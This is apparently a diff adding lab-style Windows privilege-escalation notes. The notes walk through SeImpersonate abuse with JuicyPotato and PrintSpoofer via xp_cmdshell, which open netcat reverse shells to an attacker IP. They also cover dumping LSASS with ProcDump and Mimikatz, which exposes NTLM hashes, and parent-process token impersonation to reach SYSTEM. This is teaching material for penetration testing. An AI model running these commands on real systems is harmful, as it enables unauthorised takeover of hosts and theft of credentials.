@@ -692,7 +692,6 @@ Mode                LastWriteTime         Length Name
 <SNIP>
 ```
 
-
 ## Reviewing LSASS Named Pipe Permissions
 
 ```powershell
@@ -794,3 +793,308 @@ Sysinternals - www.sysinternals.com
         FILE_ALL_ACCESS
 ```
 
+# Windows Privileges Overview
+
+If we run an elevated command window, we can see the complete listing of rights available to us:
+
+```powershell
+PS C:\htb> whoami 
+
+winlpe-srv01\administrator
+
+
+PS C:\htb> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== ========
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Disabled
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
+```
+
+When a privilege is listed for our account in the `Disabled` state, it means that our account has the specific privilege assigned. Still, it cannot be used in an access token to perform the associated actions until it is enabled.
+
+A standard user, in contrast, has drastically fewer rights.
+
+```powershell
+PS C:\htb> whoami 
+
+winlpe-srv01\htb-student
+
+
+PS C:\htb> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+```
+
+User rights increase based on the groups they are placed in or their assigned privileges. Below is an example of the rights granted to users in the `Backup Operators` group. Users in this group do have other rights that UAC currently restricts.
+
+Still, we can see from this command that they have the [SeShutdownPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/shut-down-the-system), which means that they can shut down a domain controller that could cause a massive service interruption should they log onto a domain controller locally (not via RDP or WinRM).
+
+```powershell
+PS C:\htb> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeShutdownPrivilege           Shut down the system           Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+```
+
+# SeImpersonate and SeAssignPrimaryToken
+
+Legitimate programs may utilize another process's token to escalate from Administrator to Local System, which has additional privileges. Processes generally do this by making a call to the WinLogon process to get a SYSTEM token, then executing itself with that token placing it within the SYSTEM space. 
+
+Attackers often abuse this privilege in the "Potato style" privescs - where a service account can `SeImpersonate`, but not obtain full SYSTEM level privileges. Essentially, the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used.
+
+## SeImpersonate Example - JuicyPotato
+
+Client connections to IIS and SQL Server may be configured to use Windows Authentication. The server may then need to access other resources such as file shares as the connecting client. It can be done by impersonating the user whose context the client connection is established. To do so, the service account will be granted the [Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication) privilege.
+
+In this scenario, the SQL Service service account is running in the context of the default `mssqlserver` account. Imagine we have achieved command execution as this user using `xp_cmdshell` using a set of credentials obtained in a `logins.sql` file on a file share using the `Snaffler` tool.
+
+## MSSQLClient.py
+
+```bash
+$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth
+
+Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
+[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
+[!] Press help for extra shell commands
+SQL>
+```
+
+## Enabling xp_cmdshell
+
+```bash
+SQL> enable_xp_cmdshell
+
+[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install
+```
+
+
+## Checking Account Privileges
+
+```bash
+> xp_cmdshell whoami
+output
+-----------------------------
+nt service\mssql$sqlexpress01
+
+```
+
+```bash
+> xp_cmdshell whoami /priv
+output
+--------------------------------------------------------------------------------
+NULL
+PRIVILEGES INFORMATION
+----------------------
+NULL
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+```
+
+The command `whoami /priv` confirms that [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) is listed. This privilege can be used to impersonate a privileged account such as `NT AUTHORITY\SYSTEM`. [JuicyPotato](https://github.com/ohpe/juicy-potato) can be used to exploit the `SeImpersonate` or `SeAssignPrimaryToken` privileges via DCOM/NTLM reflection abuse.
+
+## Escalating Privileges Using JuicyPotato
+
+To escalate privileges using these rights, let's first download the `JuicyPotato.exe` binary and upload this and `nc.exe` to the target server. Next, stand up a Netcat listener on port 8443, and execute the command below where `-l` is the COM server listening port, `-p` is the program to launch (cmd.exe), `-a` is the argument passed to cmd.exe, and `-t` is the `createprocess` call. Below, we are telling the tool to try both the [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) and [CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) functions, which need `SeImpersonate` or `SeAssignPrimaryToken` privileges respectively.
+
+```shell
+SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.16.8 8443 -e cmd.exe" -t *
+```
+
+## Catch the Shell
+
+```bash
+❯ nc -nvlp 8443
+Listening on 0.0.0.0 8443
+Connection received on 10.129.43.43 49698
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
+## Escalating Privileges using PrintSpoofer
+
+JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access.
+
+```bash
+dbo@master)> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.16.8 8443 -e cmd"
+output
+-------------------------------------------
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+```
+---
+
+# SeDebugPrivilege
+
+To run a particular application or service or assist with troubleshooting, a user might be assigned the [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) instead of adding the account into the administrators group. This privilege can be assigned via local or domain group policy, under `Computer Settings > Windows Settings > Security Settings`.
+
+A user may not be a local admin on a host but have rights that we cannot enumerate remotely using a tool such as BloodHound. This would be worth checking in an environment where we obtain credentials for several users and have RDP access to one or more hosts but no additional privileges.
+
+```powershell
+C:\htb> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== ========
+SeDebugPrivilege                          Debug programs                                                     Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set     
+```
+
+We can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)) process, which stores user credentials after a user logs on to a system.
+
+```powershell
+C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+ProcDump v10.0 - Sysinternals process dump utility
+Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+
+[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
+[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
+[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
+[15:25:46] Dump count reached.
+```
+
+This is successful, and we can load this in `Mimikatz` using the `sekurlsa::minidump` command. After issuing the `sekurlsa::logonPasswords` commands, we gain the NTLM hash of the local administrator account logged on locally.
+
+```powershell
+C:\htb> mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # log
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekurlsa::minidump lsass.dmp
+Switch to MINIDUMP : 'lsass.dmp'
+
+mimikatz # sekurlsa::logonpasswords
+Opening : 'lsass.dmp' file for minidump...
+
+Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
+Session           : Interactive from 4
+User Name         : DWM-4
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/31/2021 3:00:57 PM
+SID               : S-1-5-90-0-4
+        msv :
+        tspkg :
+        wdigest :
+         * Username : WINLPE-SRV01$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+<SNIP> 
+
+Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
+Session           : RemoteInteractive from 2
+User Name         : jordan
+Domain            : WINLPE-SRV01
+Logon Server      : WINLPE-SRV01
+Logon Time        : 3/31/2021 2:59:52 PM
+SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
+        msv :
+         [00000003] Primary
+         * Username : jordan
+         * Domain   : WINLPE-SRV01
+         * NTLM     : cf3a5525ee9414229e66279623ed5c58
+         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
+        tspkg :
+        wdigest :
+         * Username : jordan
+         * Domain   : WINLPE-SRV01
+         * Password : (null)
+        kerberos :
+         * Username : jordan
+         * Domain   : WINLPE-SRV01
+         * Password : (null)
+        ssp :
+        credman :
+
+<SNIP>
+```
+
+## Remote Code Execution as SYSTEM
+
+We can also leverage `SeDebugPrivilege` for [RCE](https://decoder.cloud/2018/02/02/getting-system/). Using this technique, we can elevate our privileges to SYSTEM by launching a [child process](https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes) and using the elevated rights granted to our account via `SeDebugPrivilege` to alter normal system behavior to inherit the token of a [parent process](https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads) and impersonate it. If we target a parent process running as SYSTEM (specifying the Process ID (or PID) of the target process or running program), then we can elevate our rights quickly
+
+First, transfer this [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) over to the target system. Next we just load the script and run it with the following syntax `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`.
+
+First, open an elevated PowerShell console (right-click, run as admin, and type in the credentials for the `jordan` user). Next, type `tasklist` to get a listing of running processes and accompanying PIDs.
+
+```powershell
+PS C:\htb> tasklist 
+
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System Idle Process              0 Services                   0          4 K
+System                           4 Services                   0        116 K
+smss.exe                       340 Services                   0      1,212 K
+csrss.exe                      444 Services                   0      4,696 K
+wininit.exe                    548 Services                   0      5,240 K
+csrss.exe                      556 Console                    1      5,972 K
+winlogon.exe                   636 Console                    1     10,408 K
+```
+
+```powershell
+PS C:\Tools> ImpersonateFromParentPid -ppid 636 -command cmd.exe
+[+] Got Handle for ppid: 636
+[+] Updated proc attribute list
+[+] Starting cmd.exe ...True - pid: 4920 - Last error: 122
+PS C:\Tools>
+```
